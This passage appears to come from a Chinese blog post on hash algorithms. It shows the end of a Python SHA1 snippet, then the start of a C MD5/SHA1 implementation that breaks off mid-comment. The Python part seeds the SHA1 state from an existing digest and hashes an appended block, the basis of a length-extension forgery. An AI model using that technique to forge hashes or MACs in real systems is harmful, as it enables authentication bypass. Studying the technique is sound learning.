class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>):</span><br><span class="line">        s.hash_[x/<span class="number">8</span>] = int(s1[x: x+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">    hash_str = <span class="string">"test"</span></span><br><span class="line">    block = hash_str + <span class="string">"\x80"</span> + <span class="string">"\x00"</span> * (<span class="number">64</span> - len(hash_str) - <span class="number">1</span>)</span><br><span class="line">    s.msg = block</span><br><span class="line">    s.str_to_block(<span class="number">0</span>)</span><br><span class="line">    s.block[<span class="number">15</span>] = (len(hash_str) + <span class="number">64</span>) * <span class="number">8</span></span><br><span class="line">    s.sha1_process()</span><br><span class="line">    <span class="keyword">print</span> s.final()</span><br></pre></td></tr></table></figure>
<p>该代码写的太糟，仅是为了了解sha1的流程，没有任何实用价值，下面是C源码(还有md5的部分)</p>
<figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;stdio.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;stdint.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;string.h&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;iostream&gt;</span></span><br><span class="line"><span class="built_in">#</span><span class="preprocessor"><span class="keyword">include</span> &lt;assert.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字节序的小头和大头的问题</span></span><br><span class="line"><span class="built_in">#</span>define ZEN_LITTLE_ENDIAN  <span class="number">0</span>x0123</span><br><span class="line"><span class="built_in">#</span>define ZEN_BIG_ENDIAN     <span class="number">0</span>x3210</span><br><span class="line"></span><br><span class="line"><span class="comment">//目前所有的代码都是为了小头党服务的，不知道有生之年这套代码是否还会为大头党服务一次？</span></span><br><span class="line"><span class="built_in">#</span>ifndef ZEN_BYTES_ORDER</span><br><span class="line"><span class="built_in">#</span>define ZEN_BYTES_ORDER    ZEN_LITTLE_ENDIAN</span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"></span><br><span class="line"><span class="built_in">#</span>ifndef ZEN_SWAP_UINT16</span><br><span class="line"><span class="built_in">#</span>define ZEN_SWAP_UINT16<span class="params">(x)</span>  <span class="params">(<span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>xff00)</span> &gt;&gt;  <span class="number">8</span>)</span> | <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x00ff)</span> &lt;&lt;  <span class="number">8</span>)</span>)</span></span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"><span class="built_in">#</span>ifndef ZEN_SWAP_UINT32</span><br><span class="line"><span class="built_in">#</span>define ZEN_SWAP_UINT32<span class="params">(x)</span>  <span class="params">(<span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>xff000000)</span> &gt;&gt; <span class="number">24</span>)</span> | <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x00ff0000)</span> &gt;&gt;  <span class="number">8</span>)</span> | \</span><br><span class="line">    <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x0000ff00)</span> &lt;&lt;  <span class="number">8</span>)</span> | <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x000000ff)</span> &lt;&lt; <span class="number">24</span>)</span>)</span></span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"><span class="built_in">#</span>ifndef ZEN_SWAP_UINT64</span><br><span class="line"><span class="built_in">#</span>define ZEN_SWAP_UINT64<span class="params">(x)</span>  <span class="params">(<span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>xff00000000000000)</span> &gt;&gt; <span class="number">56</span>)</span> | <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x00ff000000000000)</span> &gt;&gt;  <span class="number">40</span>)</span> | \</span><br><span class="line">    <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x0000ff0000000000)</span> &gt;&gt; <span class="number">24</span>)</span> | <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x000000ff00000000)</span> &gt;&gt;  <span class="number">8</span>)</span> | \</span><br><span class="line">    <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x00000000ff000000)</span> &lt;&lt; <span class="number">8</span> )</span> | <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x0000000000ff0000)</span> &lt;&lt;  <span class="number">24</span>)</span> | \</span><br><span class="line">    <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x000000000000ff00)</span> &lt;&lt; <span class="number">40</span> )</span> | <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="number">0</span>x00000000000000ff)</span> &lt;&lt;  <span class="number">56</span>)</span>)</span></span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"></span><br><span class="line"><span class="comment">//将一个（字符串）数组，拷贝到另外一个uint32_t数组，同时每个uint32_t反字节序</span></span><br><span class="line">void <span class="built_in">*</span>swap_uint32_memcpy<span class="params">(void *to, const void *from, size_t length)</span></span><br><span class="line">&#123;</span><br><span class="line">    memcpy<span class="params">(to, from, length)</span>;</span><br><span class="line">    size_t remain_len =  <span class="params">(<span class="number">4</span> - <span class="params">(length &amp; <span class="number">3</span>)</span>)</span> &amp; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//数据不是4字节的倍数,补充0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="params">(remain_len)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="params">(size_t i = <span class="number">0</span>; i &lt; remain_len; ++i)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">*</span><span class="params">(<span class="params">(char *)</span><span class="params">(to)</span> + length + i)</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//调整成4的倍数</span></span><br><span class="line">        length += remain_len;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//所有的数据反转</span></span><br><span class="line">    <span class="keyword">for</span> <span class="params">(size_t i = <span class="number">0</span>; i &lt; length / <span class="number">4</span>; ++i)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="params">(<span class="params">(uint32_t *)</span>to)</span>[i] = ZEN_SWAP_UINT32<span class="params">(<span class="params">(<span class="params">(uint32_t *)</span>to)</span>[i])</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return to;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///MD5的结果数据长度</span></span><br><span class="line">static const size_t ZEN_MD5_HASH_SIZE   = <span class="number">16</span>;</span><br><span class="line"><span class="comment">///SHA1的结果数据长度</span></span><br><span class="line">static const size_t ZEN_SHA1_HASH_SIZE  = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace ZEN_LIB</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      求某个内存块的MD5，</span><br><span class="line">@return     unsigned char* 返回的的结果，</span><br><span class="line">@param[in]  buf    求MD5的内存BUFFER指针</span><br><span class="line">@param[in]  size   BUFFER长度</span><br><span class="line">@param[out] result 结果</span><br><span class="line">*/</span></span><br><span class="line">unsigned char <span class="built_in">*</span>md5<span class="params">(const unsigned char *buf,</span><br><span class="line">                   size_t size,</span><br><span class="line">                   unsigned char result[ZEN_MD5_HASH_SIZE])</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      求内存块BUFFER的SHA1值</span><br><span class="line">@return     unsigned char* 返回的的结果</span><br><span class="line">@param[in]  buf    求SHA1的内存BUFFER指针</span><br><span class="line">@param[in]  size   BUFFER长度</span><br><span class="line">@param[out] result 结果</span><br><span class="line">*/</span></span><br><span class="line">unsigned char <span class="built_in">*</span>sha1<span class="params">(const unsigned char *buf,</span><br><span class="line">                    size_t size,</span><br><span class="line">                    unsigned char result[ZEN_SHA1_HASH_SIZE])</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//================================================================================================</span></span><br><span class="line"><span class="comment">//MD5的算法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//每次处理的BLOCK的大小</span></span><br><span class="line">static const size_t ZEN_MD5_BLOCK_SIZE = <span class="number">64</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//md5算法的上下文，保存一些状态，中间数据，结果</span></span><br><span class="line">typedef struct md5_ctx</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//处理的数据的长度</span></span><br><span class="line">    uint64_t length_;</span><br><span class="line">    <span class="comment">//还没有处理的数据长度</span></span><br><span class="line">    uint64_t unprocessed_;</span><br><span class="line">    <span class="comment">//取得的HASH结果（中间数据）</span></span><br><span class="line">    uint32_t  hash_[<span class="number">4</span>];</span><br><span class="line">&#125; md5_ctx;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">#</span>define ROTL32<span class="params">(dword, n)</span> <span class="params">(<span class="params">(dword)</span> &lt;&lt; <span class="params">(n)</span> ^ <span class="params">(<span class="params">(dword)</span> &gt;&gt; <span class="params">(<span class="number">32</span> - <span class="params">(n)</span>)</span>)</span>)</span></span><br><span class="line"><span class="built_in">#</span>define ROTR32<span class="params">(dword, n)</span> <span class="params">(<span class="params">(dword)</span> &gt;&gt; <span class="params">(n)</span> ^ <span class="params">(<span class="params">(dword)</span> &lt;&lt; <span class="params">(<span class="number">32</span> - <span class="params">(n)</span>)</span>)</span>)</span></span><br><span class="line"><span class="built_in">#</span>define ROTL64<span class="params">(qword, n)</span> <span class="params">(<span class="params">(qword)</span> &lt;&lt; <span class="params">(n)</span> ^ <span class="params">(<span class="params">(qword)</span> &gt;&gt; <span class="params">(<span class="number">64</span> - <span class="params">(n)</span>)</span>)</span>)</span></span><br><span class="line"><span class="built_in">#</span>define ROTR64<span class="params">(qword, n)</span> <span class="params">(<span class="params">(qword)</span> &gt;&gt; <span class="params">(n)</span> ^ <span class="params">(<span class="params">(qword)</span> &lt;&lt; <span class="params">(<span class="number">64</span> - <span class="params">(n)</span>)</span>)</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      内部函数，初始化MD5的context，内容</span><br><span class="line">@param      ctx</span><br><span class="line">*/</span></span><br><span class="line">static void zen_md5_init<span class="params">(md5_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    ctx-&gt;length_ = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;unprocessed_ = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* initialize state */</span></span><br><span class="line">    ctx-&gt;hash_[<span class="number">0</span>] = <span class="number">0</span>x67452301;</span><br><span class="line">    ctx-&gt;hash_[<span class="number">1</span>] = <span class="number">0</span>xefcdab89;</span><br><span class="line">    ctx-&gt;hash_[<span class="number">2</span>] = <span class="number">0</span>x98badcfe;</span><br><span class="line">    ctx-&gt;hash_[<span class="number">3</span>] = <span class="number">0</span>x10325476;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* First, define four auxiliary functions that each take as input</span><br><span class="line"> * three 32-bit words and returns a 32-bit word.*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* F(x,y,z) = ((y XOR z) AND x) XOR z - is faster then original version */</span></span><br><span class="line"><span class="built_in">#</span>define MD5_F<span class="params">(x, y, z)</span> <span class="params">(<span class="params">(<span class="params">(<span class="params">(y)</span> ^ <span class="params">(z)</span>)</span> &amp; <span class="params">(x)</span>)</span> ^ <span class="params">(z)</span>)</span></span><br><span class="line"><span class="built_in">#</span>define MD5_G<span class="params">(x, y, z)</span> <span class="params">(<span class="params">(<span class="params">(x)</span> &amp; <span class="params">(z)</span>)</span> | <span class="params">(<span class="params">(y)</span> &amp; <span class="params">(~z)</span>)</span>)</span></span><br><span class="line"><span class="built_in">#</span>define MD5_H<span class="params">(x, y, z)</span> <span class="params">(<span class="params">(x)</span> ^ <span class="params">(y)</span> ^ <span class="params">(z)</span>)</span></span><br><span class="line"><span class="built_in">#</span>define MD5_I<span class="params">(x, y, z)</span> <span class="params">(<span class="params">(y)</span> ^ <span class="params">(<span class="params">(x)</span> | <span class="params">(~z)</span>)</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* transformations for rounds 1, 2, 3, and 4. */</span></span><br><span class="line"><span class="built_in">#</span>define MD5_ROUND1<span class="params">(a, b, c, d, x, s, ac)</span> &#123; \</span><br><span class="line">        <span class="params">(a)</span> += MD5_F<span class="params">(<span class="params">(b)</span>, <span class="params">(c)</span>, <span class="params">(d)</span>)</span> + <span class="params">(x)</span> + <span class="params">(ac)</span>; \</span><br><span class="line">        <span class="params">(a)</span> = ROTL32<span class="params">(<span class="params">(a)</span>, <span class="params">(s)</span>)</span>; \</span><br><span class="line">        <span class="params">(a)</span> += <span class="params">(b)</span>; \</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">#</span>define MD5_ROUND2<span class="params">(a, b, c, d, x, s, ac)</span> &#123; \</span><br><span class="line">        <span class="params">(a)</span> += MD5_G<span class="params">(<span class="params">(b)</span>, <span class="params">(c)</span>, <span class="params">(d)</span>)</span> + <span class="params">(x)</span> + <span class="params">(ac)</span>; \</span><br><span class="line">        <span class="params">(a)</span> = ROTL32<span class="params">(<span class="params">(a)</span>, <span class="params">(s)</span>)</span>; \</span><br><span class="line">        <span class="params">(a)</span> += <span class="params">(b)</span>; \</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">#</span>define MD5_ROUND3<span class="params">(a, b, c, d, x, s, ac)</span> &#123; \</span><br><span class="line">        <span class="params">(a)</span> += MD5_H<span class="params">(<span class="params">(b)</span>, <span class="params">(c)</span>, <span class="params">(d)</span>)</span> + <span class="params">(x)</span> + <span class="params">(ac)</span>; \</span><br><span class="line">        <span class="params">(a)</span> = ROTL32<span class="params">(<span class="params">(a)</span>, <span class="params">(s)</span>)</span>; \</span><br><span class="line">        <span class="params">(a)</span> += <span class="params">(b)</span>; \</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">#</span>define MD5_ROUND4<span class="params">(a, b, c, d, x, s, ac)</span> &#123; \</span><br><span class="line">        <span class="params">(a)</span> += MD5_I<span class="params">(<span class="params">(b)</span>, <span class="params">(c)</span>, <span class="params">(d)</span>)</span> + <span class="params">(x)</span> + <span class="params">(ac)</span>; \</span><br><span class="line">        <span class="params">(a)</span> = ROTL32<span class="params">(<span class="params">(a)</span>, <span class="params">(s)</span>)</span>; \</span><br><span class="line">        <span class="params">(a)</span> += <span class="params">(b)</span>; \</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span><br><span class="line">@brief      内部函数，将64个字节，16个uint32_t的数组进行摘要（杂凑）处理，处理的数据自己序是小头数据</span><br><span class="line">@param      state 存放处理的hash数据结果</span><br><span class="line">@param      block 